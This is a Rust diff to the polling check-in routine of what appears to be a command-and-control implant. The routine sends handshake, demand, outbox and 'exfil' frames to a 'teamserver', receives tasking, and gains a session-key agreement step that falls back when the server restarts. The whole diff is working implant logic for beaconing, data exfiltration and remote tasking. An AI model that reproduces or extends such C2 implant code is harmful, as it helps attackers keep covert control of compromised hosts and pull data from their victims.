@@ -37,16 +37,25 @@ impl Poll {
 impl Contact for Poll {
     fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
         // Channel output produced since the last cycle rides this request --
-        // the poll discipline's delivery edge.
+        // the poll discipline's delivery edge -- unless this cycle is the
+        // session-key arm's agreement contact: the offer rides the handshake
+        // alone (architecture.md Sec 9), so the demands and batch wait for
+        // the session it opens.
         session.drain_channels();
-        let demands = session.staged_demands();
-        let batch = session.outbox.batch();
-        let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
-        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len() + exfil.len());
-        frames.push(session.handshake_frame());
-        frames.extend(demands);
-        frames.extend(batch.iter().cloned());
-        frames.extend(exfil);
+        let frames = if session.needs_agreement() {
+            vec![session.handshake_frame()]
+        } else {
+            let demands = session.staged_demands();
+            let batch = session.outbox.batch();
+            let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
+            let mut frames = Vec::with_capacity(1 + demands.len() + batch.len() + exfil.len());
+            frames.push(session.handshake_frame());
+            frames.extend(demands);
+            frames.extend(batch.iter().cloned());
+            frames.extend(exfil);
+            frames
+        };
+        let batch_len = frames.len() - 1;
         let (body, content_type) = session.encode_outgoing(&frames);
 
         let response = {
@@ -63,13 +72,21 @@ impl Contact for Poll {
             .take(64 << 20)
             .read_to_end(&mut bytes)?;
         if status != 200 {
+            // A refusal while session keys are held is the fallback signal:
+            // the keys no longer name a live agreement (a restarted
+            // teamserver), so the next cycle offers a fresh one instead of
+            // wedging on the dead session.
+            if status == 401 {
+                session.drop_session_keys();
+            }
             return Err(ContactError::Transport(format!("status {status}")));
         }
-        let inbound = session
-            .decode_incoming(&bytes)
-            .ok_or(ContactError::Protocol(
-                "the contact response did not verify under the baked key",
-            ))?;
+        let Some(inbound) = session.decode_incoming(&bytes) else {
+            session.drop_session_keys();
+            return Err(ContactError::Protocol(
+                "the contact response did not verify under the active seal",
+            ));
+        };
         let first = inbound.first().ok_or(ContactError::Protocol(
             "the contact response carried no frames",
         ))?;
@@ -81,8 +98,9 @@ impl Contact for Poll {
         }
 
         // The batch crossed: its frames are delivered, and this cycle's
-        // demands are answered below.
-        session.outbox.batch_crossed(batch.len());
+        // demands are answered below. An agreement cycle carried none of
+        // them -- the zero-length crossing keeps the bookkeeping honest.
+        session.outbox.batch_crossed(batch_len);
         accept_staged(session, &inbound);
         accept_tasking(session, &inbound[1..], acks);
         // Echoes the channel input just routed may already have produced
